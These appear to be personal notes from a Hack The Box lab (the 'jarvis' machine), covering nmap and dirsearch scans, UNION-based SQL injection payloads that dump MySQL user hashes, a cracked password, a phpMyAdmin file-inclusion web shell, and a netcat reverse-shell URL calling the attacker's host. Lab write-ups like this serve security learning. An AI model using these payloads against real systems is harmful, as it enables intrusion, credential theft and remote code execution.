nmap
```
┌──(kali㉿kali)-[~/HTB/jarvis]
└─$ sudo nmap -T5 -p- -A -oN nmap 10.129.229.137  
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 20:26 EST
Warning: 10.129.229.137 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.229.137
Host is up (0.050s latency).
Not shown: 64873 closed tcp ports (reset), 659 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   49.59 ms 10.10.14.1
2   49.75 ms 10.129.229.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.15 seconds
```

```
┌──(kali㉿kali)-[~/HTB/jarvis]
└─$ dirsearch -u http://10.129.229.137/      
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/HTB/jarvis/reports/http_10.129.229.137/__25-01-19_20-26-07.txt

Target: http://10.129.229.137/

[20:26:07] Starting: 
[20:26:09] 301 -  313B  - /js  ->  http://10.129.229.137/js/                
[20:26:14] 403 -  279B  - /.ht_wsr.txt                                      
[20:26:14] 403 -  279B  - /.htaccess_orig                                   
[20:26:14] 403 -  279B  - /.htaccess.bak1                                   
[20:26:14] 403 -  279B  - /.htaccess_extra                                  
[20:26:14] 403 -  279B  - /.htaccess.orig
[20:26:14] 403 -  279B  - /.htaccess.sample
[20:26:14] 403 -  279B  - /.htaccessOLD                                     
[20:26:14] 403 -  279B  - /.htaccess_sc                                     
[20:26:14] 403 -  279B  - /.htaccess.save
[20:26:14] 403 -  279B  - /.htaccessOLD2                                    
[20:26:14] 403 -  279B  - /.htaccessBAK
[20:26:14] 403 -  279B  - /.html
[20:26:14] 403 -  279B  - /.htpasswd_test                                   
[20:26:14] 403 -  279B  - /.httr-oauth                                      
[20:26:14] 403 -  279B  - /.htpasswds
[20:26:14] 403 -  279B  - /.htm                                             
[20:26:17] 403 -  279B  - /.php                                             
[20:26:17] 403 -  279B  - /.php3                                            
[20:27:16] 301 -  314B  - /css  ->  http://10.129.229.137/css/              
[20:27:33] 301 -  316B  - /fonts  ->  http://10.129.229.137/fonts/          
[20:27:33] 200 -  755B  - /footer.php                                       
[20:27:40] 200 -  819B  - /images/                                          
[20:27:40] 301 -  317B  - /images  ->  http://10.129.229.137/images/
[20:27:45] 200 -  680B  - /js/                                              
[20:28:10] 301 -  321B  - /phpmyadmin  ->  http://10.129.229.137/phpmyadmin/
[20:28:13] 200 -    1KB - /phpmyadmin/README                                
[20:28:13] 200 -    3KB - /phpmyadmin/doc/html/index.html                   
[20:28:14] 200 -    4KB - /phpmyadmin/index.php                             
[20:28:14] 200 -    4KB - /phpmyadmin/                                      
[20:28:14] 200 -   19KB - /phpmyadmin/ChangeLog                             
[20:28:31] 403 -  279B  - /server-status/                                   
[20:28:31] 403 -  279B  - /server-status                                    
                                                                             
Task Completed
```

![Pasted image 20250120092854](<0. Attachments/Pasted image 20250120092854.png>)

![Pasted image 20250120093210](<0. Attachments/Pasted image 20250120093210.png>)

![Pasted image 20250120093403](<0. Attachments/Pasted image 20250120093403.png>)

![Pasted image 20250120093737](<0. Attachments/Pasted image 20250120093737.png>)

sqli
![Pasted image 20250120093849](<0. Attachments/Pasted image 20250120093849.png>)

```
http://10.129.229.137/room.php?cod=100%20UNION%20SELECT%201,2,3,4,5,6,7;--%20-
```
![Pasted image 20250120094224](<0. Attachments/Pasted image 20250120094224.png>)

payloads
```
SELECT 1, group_concat(schema_name), 3, 4, 5, 6, 7 from information_schema.schemata;-- -

SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='hotel' ;-- -

SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='room';-- -

SELECT 1, group_concat(table_name), 3, 4, 5, 6, 7 from information_schema.tables where table_schema='mysql' ;-- -

SELECT 1, group_concat(column_name), 3, 4, 5, 6, 7 from information_schema.columns where table_name='user';-- -

SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -
```

hash retrieved 
![Pasted image 20250120124344](<0. Attachments/Pasted image 20250120124344.png>)

```
2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 --> imissyou
```
![Pasted image 20250120124558](<0. Attachments/Pasted image 20250120124558.png>)

https://hashes.com/en/decrypt/hash

![Pasted image 20250120124817](<0. Attachments/Pasted image 20250120124817.png>)

https://medium.com/@happyholic1203/phpmyadmin-4-8-0-4-8-1-remote-code-execution-257bcc146f8e

![Pasted image 20250120124949](<0. Attachments/Pasted image 20250120124949.png>)

go to SQL Tab and enter a query
![Pasted image 20250120125112](<0. Attachments/Pasted image 20250120125112.png>)
```
SELECT '<?php system($_GET["cmd"]);?>'
```

using my cookie
![Pasted image 20250120125418](<0. Attachments/Pasted image 20250120125418.png>)

![Pasted image 20250120125442](<0. Attachments/Pasted image 20250120125442.png>)

revshell payload
```
http://10.129.229.137/phpmyadmin/index.php?cmd=nc%20-e%20/bin/sh%2010.10.14.3%20443&target=db_sql.php%3f/../../../../../var/lib/php/sessions/sess_rtr6nktcj6e0u290rck5s4td4k3ghn2f
```

![Pasted image 20250120125639](<0. Attachments/Pasted image 20250120125639.png>)

![Pasted image 20250120130026](<0. Attachments/Pasted image 20250120130026.png>)
![Pasted image 20250120130508](<0. Attachments/Pasted image 20250120130508.png>)

![Pasted image 20250120130843](<0. Attachments/Pasted image 20250120130843.png>)

priv esc
![Pasted image 20250120131431](<0. Attachments/Pasted image 20250120131431.png>)

![Pasted image 20250120131229](<0. Attachments/Pasted image 20250120131229.png>)